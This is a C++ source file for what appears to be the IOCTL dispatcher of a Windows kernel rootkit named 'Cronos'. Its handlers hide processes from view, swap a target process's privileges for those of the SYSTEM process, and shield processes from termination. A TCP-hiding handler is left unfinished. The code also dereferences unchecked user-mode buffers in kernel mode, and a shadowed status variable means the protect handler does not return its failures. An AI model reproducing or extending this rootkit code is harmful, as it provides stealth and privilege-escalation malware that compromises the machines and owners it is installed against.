#include "Dispatcher.hpp"
#include "Rootkit.hpp"


NTSTATUS Dispatch::DriverDispatch(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
	NTSTATUS status = STATUS_SUCCESS;
	auto stack = IoGetCurrentIrpStackLocation(Irp);

	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
		case IOCTL_HIDEPROC:
		{
	#if DEBUG
			KdPrint(("[+] Received hide process request\n"));
	#endif
			auto len = stack->Parameters.DeviceIoControl.InputBufferLength;
			if (len < sizeof(HideProcData))
			{
	#if DEBUG
				KdPrint(("[-] Received too small buffer\n"));
	#endif
				status = STATUS_BUFFER_TOO_SMALL;
				break;
			}

			auto data = (HideProcData*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
			if (data == nullptr)
			{
	#if DEBUG
				KdPrint(("[-] Received empty buffer\n"));
	#endif
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			ULONG targetPid = data->TargetPID;
			Ghost::GhostProcess(targetPid);
			break;
		}

		case IOCTL_ELEVATEME:
		{
			PEPROCESS pTargetProcess, pSrcProcess;
	#if DEBUG
			KdPrint(("[+] Received elevation request\n"));
	#endif
			auto len = stack->Parameters.DeviceIoControl.InputBufferLength;
			if (len < sizeof(ElevateData))
			{
	#if DEBUG
				KdPrint(("[-] Received too small buffer\n"));
	#endif
				status = STATUS_BUFFER_TOO_SMALL;
				break;
			}

			auto data = (ElevateData*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
			if (data == nullptr)
			{
	#if DEBUG
				KdPrint(("[-] Received empty buffer\n"));
	#endif
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			ULONG targetPid = data->TargetPID;
			ULONG srcPid = 4; //System PID is always 4
	#if DEBUG
			KdPrint(("[+] Target PID: %d and destination PID: %d\n", targetPid, srcPid));
	#endif
			status = Rootkit::ProcessElevation(srcPid, targetPid);
			break;
		}

		case IOCTL_HIDETCP:
		{
	#if DEBUG
			KdPrint(("[+] Received hide TCP request\n"));
	#endif
			auto len = stack->Parameters.DeviceIoControl.InputBufferLength;
			if (len < sizeof(HideTcpData))
			{
	#if DEBUG
				KdPrint(("[-] Received too small buffer\n"));
	#endif
				status = STATUS_BUFFER_TOO_SMALL;
				break;
			}

			auto data = (HideTcpData*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
			if (data == nullptr)
			{
#if DEBUG
				KdPrint(("[-] Received empty buffer\n"));
#endif
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			ULONG port = data->Port;
			break;
		}

		case IOCTL_PROTECT:
		{
#if DEBUG
			KdPrint(("[+] Received process protect request!\n"));
#endif
			NTSTATUS status = STATUS_SUCCESS;
			auto len = stack->Parameters.DeviceIoControl.InputBufferLength;
			if (len < sizeof(ProtectProcessData))
			{
#if DEBUG
				KdPrint(("[-] Received too small buffer\n"));
#endif
				status = STATUS_BUFFER_TOO_SMALL;
				break;
			}

			auto data = (ProtectProcessData*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
			if (data == nullptr)
			{
#if DEBUG
				KdPrint(("[-] Received empty buffer\n"));
#endif
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			ULONG targetPid = data->TargetPID;
#if DEBUG
			KdPrint(("[+] Elevating process\n"));
#endif
			status = Rootkit::ProcessElevation(4, targetPid);
			if (!NT_SUCCESS(status))
			{
				break;
			}
#if DEBUG
			KdPrint(("[*] Protecting process\n"));
#endif
			status = Rootkit::ProtectProcess(targetPid);
			if (!NT_SUCCESS(status))
			{
				break;
			}
			break;
		}

		default:
			status = STATUS_INVALID_DEVICE_REQUEST;
			break;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

_Use_decl_annotations_
NTSTATUS Dispatch::DriverCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

VOID Dispatch::DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
#if DEBUG
	KdPrint(("[+] Driver unload called\n"));
#endif

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Cronos");
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);

#if DEBUG
	KdPrint(("[*] Driver unloaded!\n"));
#endif
}